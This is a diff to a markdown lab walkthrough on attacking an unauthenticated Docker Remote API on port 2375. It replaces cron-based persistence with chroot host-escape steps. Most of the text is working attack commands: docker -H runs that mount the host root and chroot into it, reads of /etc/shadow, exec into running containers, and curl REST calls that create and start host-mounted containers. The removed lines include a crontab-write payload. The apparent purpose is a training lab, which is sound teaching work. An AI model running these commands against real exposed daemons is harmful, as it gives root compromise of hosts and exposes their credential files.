@@ -34,8 +34,8 @@ When TCP port 2375 is exposed without mutual TLS authentication, anyone who can 
 |                                                             |
 |  Step 3: Execution & Host Escape                            |
 |    - POST /containers/{id}/start                            |
-|    - Write reverse shell into /host/etc/cron.d/             |
-|    - Overwrite /host/root/.ssh/authorized_keys              |
+|    - Escape to host rootfs via chroot /host                 |
+|    - Direct execution via docker -H tcp://... exec          |
 |                                                             |
 |  [Result: Unrestricted Root Compromise of the Host System]  |
 +-------------------------------------------------------------+
@@ -46,6 +46,7 @@ When TCP port 2375 is exposed without mutual TLS authentication, anyone who can 
 ## Exploitation Walkthrough
 
 ### 1. Reconnaissance via Curl
+
 Verify that the remote API responds to unauthenticated requests:
 
 ```bash
@@ -60,6 +61,7 @@ curl -s http://localhost:2375/info | jq '{Containers, Images, ServerVersion, Ope
 ```
 
 ### 2. Targeting via Local Docker CLI
+
 You can point your local `docker` client directly at the target using the `-H` flag:
 
 ```bash
@@ -68,20 +70,45 @@ docker -H tcp://localhost:2375 ps
 docker -H tcp://localhost:2375 images
 ```
 
-### 3. Spawning a Container with Host Root Filesystem Mount
-By mounting the host's `/` directory into a container, an attacker accesses all host files as root:
+### 3. Interactive Shell & Host Escape via Rootfs Mount (`chroot /host`)
+
+By mounting the host root filesystem (`/`) into a new container, an attacker can chroot directly into `/host` to obtain a full root interactive shell on the underlying host or DinD instance:
 
 ```bash
-# Method A: Using Docker CLI
-docker -H tcp://localhost:2375 run -it --rm -v /:/host alpine:latest sh -c "cat /host/etc/shadow | head -n 5"
+# Method A: Interactive root shell via chroot on the mounted host
+docker -H tcp://localhost:2375 run -it --rm -v /:/host alpine:latest chroot /host sh
 
-# Method B: Using Direct REST API Calls via Curl
-# Step 1: Create container with host root mounted
+# Method B: Execute arbitrary commands on the host rootfs
+docker -H tcp://localhost:2375 run --rm -v /:/host alpine:latest chroot /host id
+docker -H tcp://localhost:2375 run --rm -v /:/host alpine:latest chroot /host cat /etc/shadow
+```
+
+### 4. Direct Remote Command Execution via Docker Exec
+
+Attackers can execute commands directly within any active container on the exposed daemon using `docker exec`:
+
+```bash
+# Spawn an interactive shell inside a running container
+docker -H tcp://localhost:2375 exec -it cyberlab_realworld_docker_api sh
+
+# Execute arbitrary commands non-interactively
+docker -H tcp://localhost:2375 exec cyberlab_realworld_docker_api ps aux
+```
+
+### 5. Remote Host Compromise via Raw REST API (Curl)
+
+> [!NOTE]
+> In traditional Linux host escapes, attackers often write scheduled tasks into `/host/etc/crontab` or `/host/etc/cron.d/`. However, containerized Docker environments (such as Alpine DinD) do not run an active cron daemon (`crond`). Instead, attackers achieve immediate RCE by executing commands directly using `chroot /host` or via the Docker Remote API `exec` endpoint.
+
+**Option A: Spawn Container with Host Mount and Chroot Execution**
+
+```bash
+# Step 1: Create container with host root mounted and chroot execution
 CONTAINER_ID=$(curl -s -X POST http://localhost:2375/containers/create \
   -H "Content-Type: application/json" \
   -d '{
-    "Image": "alpine",
-    "Cmd": ["/bin/sh", "-c", "echo \"* * * * * root echo pwned > /host/tmp/hacked\" >> /host/etc/crontab"],
+    "Image": "alpine:latest",
+    "Cmd": ["chroot", "/host", "sh", "-c", "echo pwned > /tmp/hacked && id && cat /etc/os-release"],
     "HostConfig": {
       "Binds": ["/:/host"]
     }
@@ -89,10 +116,28 @@ CONTAINER_ID=$(curl -s -X POST http://localhost:2375/containers/create \
 
 # Step 2: Start container
 curl -s -X POST "http://localhost:2375/containers/${CONTAINER_ID}/start"
+
+# Step 3: Fetch execution output logs
+curl -s "http://localhost:2375/containers/${CONTAINER_ID}/logs?stdout=1&stderr=1"
 ```
 
-### 4. Kinsing / Cryptojacking Emulation
-Automated malware scans for port 2375, creates a container running a persistent mining binary, drops persistence inside `/etc/cron.d/`, and kills competitor miners.
+**Option B: REST API Exec Instance on Existing Container**
+
+```bash
+# Step 1: Create exec instance
+EXEC_ID=$(curl -s -X POST http://localhost:2375/containers/cyberlab_realworld_docker_api/exec \
+  -H "Content-Type: application/json" \
+  -d '{"AttachStdout": true, "AttachStderr": true, "Cmd": ["id"]}' | jq -r .Id)
+
+# Step 2: Start exec instance and stream output
+curl -s -X POST "http://localhost:2375/exec/${EXEC_ID}/start" \
+  -H "Content-Type: application/json" \
+  -d '{"Detach": false, "Tty": false}'
+```
+
+### 6. Kinsing / Cryptojacking Emulation
+
+Automated malware scans for port 2375, creates a container running a persistent mining binary, escapes to the host using rootfs volume mounts (`chroot /host`) or Docker `exec`, and terminates competitor mining processes.
 
 ---
 
